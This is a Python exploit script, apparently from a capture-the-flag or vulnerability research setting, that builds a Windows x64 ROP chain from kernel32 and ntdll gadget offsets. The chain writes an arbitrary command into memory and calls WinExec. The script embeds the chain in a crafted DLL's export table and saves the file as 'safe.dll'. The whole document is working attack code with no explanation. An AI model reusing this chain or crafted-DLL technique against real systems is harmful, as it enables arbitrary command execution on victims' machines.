#!/usr/bin/python3

from pwn import *
from sys import argv
from pefile import *

MAX_VALUE = 0xffffffff
RET_IDX = 0x4d

# Relative addresses

winexec_off = 0x98d80
writable_off = 0x10a000
pop_r8_off = 0x9079
pop_rcx_off = 0x7a9a3
mov_r8_rcx_off = 0x4314
pop_rdx_off = 0x222f3

def gen_by_addr(kernel32_base, filename, cmd, delta):
    ntdll_base = kernel32_base + delta

    # Absolute addresses

    winexec_addr = kernel32_base + winexec_off
    target_addr = kernel32_base + writable_off + 0x400
     
    pop_rdx_addr = ntdll_base + pop_rdx_off

    pop_r8_addr = ntdll_base + pop_r8_off
    mov_r8_rcx_addr = ntdll_base + mov_r8_rcx_off
    pop_rcx_addr = ntdll_base + pop_rcx_off

    # Build ROP

    def write_to(addr, value):
        assert value <= MAX_VALUE and addr <= MAX_VALUE

        rop = []
        rop.append(pop_r8_addr)
        rop.append(addr)
        rop.append(pop_rcx_addr)
        rop.append(value)
        rop.append(mov_r8_rcx_addr)

        return rop

    def generate_dll(new_exe, cmd):
        # log.info(f'cmd is {len(cmd)} bytes long')

        rop = []

        # Avoid overwrite ctx pointer

        rop.append(pop_r8_addr)
        rop.append(0xdeadbeef)

        # Write cmd one dword at a time

        for index in range(0, len(cmd), 4):
            dword = u32(cmd[index:index+4].ljust(4, b'\x20'))
            rop += write_to(target_addr+index, dword)

        # Call WinExec

        rop.append(pop_rcx_addr)
        rop.append(target_addr)
        rop.append(pop_rdx_addr)
        rop.append(0)
        rop.append(winexec_addr)

        pe = PE(filename)

        name_ordinals_rva = pe.DIRECTORY_ENTRY_EXPORT.struct.AddressOfNameOrdinals
        names_rva = pe.DIRECTORY_ENTRY_EXPORT.struct.AddressOfNames

        pairs = []
        # log.info('Building write pairs')

        for idx, addr in enumerate(rop):
            if addr == 0xdeadbeef:
                continue
            # log.info(f'{hex(RET_IDX + idx)} - {hex(addr)}' )
            pairs.append((RET_IDX + idx, addr))
            
        # log.info('Writing values into export directory')

        for idx, pair in enumerate(pairs):
            ordinal, name_ptr = pair
            pe.set_dword_at_rva(names_rva + 4*idx, name_ptr)
            pe.set_word_at_rva(name_ordinals_rva + 2*idx, ordinal)

        # log.info(f'NumberOfNames = {hex(len(pairs))}')

        pe.DIRECTORY_ENTRY_EXPORT.struct.NumberOfFunctions = 0
        pe.DIRECTORY_ENTRY_EXPORT.struct.NumberOfNames = len(pairs)

        pe.write(new_exe)

    generate_dll(f'safe.dll', cmd)
